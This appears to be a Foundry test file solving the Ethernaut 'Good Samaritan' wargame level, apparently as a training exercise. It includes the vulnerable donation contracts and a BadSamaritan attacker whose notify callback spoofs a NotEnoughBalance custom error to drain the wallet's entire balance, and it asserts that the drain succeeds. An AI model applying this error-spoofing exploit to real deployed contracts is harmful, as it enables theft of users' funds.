// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";


interface INotifyable {
    function notify(uint256 amount) external;
}

contract Coin {
    mapping(address => uint256) public balances;

    constructor(address wallet) {
        balances[wallet] = 1000000 * 10**18; 
    }

    function transfer(address dest, uint256 amount) external returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        balances[dest] += amount;

        if (isContract(dest)) {

            try INotifyable(dest).notify(amount) {

            } catch (bytes memory err) {

                assembly {
                    revert(add(err, 32), mload(err))
                }
            }
        }
        return true;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}

contract Wallet {
    address public owner;
    Coin public coin;

    error NotEnoughBalance(); 

    constructor() {
        owner = msg.sender;
    }

    function setCoin(Coin _coin) external {
        coin = _coin;
    }

    function donate10(address dest) external {
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        }
        coin.transfer(dest, 10);
    }

    function transferRemainder(address dest) external {
        uint256 balance = coin.balances(address(this));
        coin.transfer(dest, balance);
    }
}

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));
        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool) {

        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {

            if (keccak256(abi.encodePacked(err)) == keccak256(abi.encodePacked(Wallet.NotEnoughBalance.selector))) {
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
        return true; 
    }
}

contract BadSamaritan {
    GoodSamaritan public target;
    
    error NotEnoughBalance();

    constructor(address _target) {
        target = GoodSamaritan(_target);
    }

    function attack() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount <= 10) {

            revert NotEnoughBalance(); 
        }
        
    }
}

contract GoodSamaritanTest is Test {
    GoodSamaritan levelInstance;

    function testLevel27_GoodSamaritan_Local() public {
        levelInstance = new GoodSamaritan();
        
        address walletAddr = address(levelInstance.wallet());
        Coin coin = levelInstance.coin();
        console.log("Target Balance Before:", coin.balances(walletAddr));

        BadSamaritan badGuy = new BadSamaritan(address(levelInstance));
        
        badGuy.attack();

        uint256 badGuyBalance = coin.balances(address(badGuy));
        console.log("BadSamaritan Balance After:", badGuyBalance);
        
        uint256 targetBalanceAfter = coin.balances(walletAddr);
        console.log("Target Balance After:", targetBalanceAfter);

        assertEq(targetBalanceAfter, 0);
        assertTrue(badGuyBalance > 10);
    }
}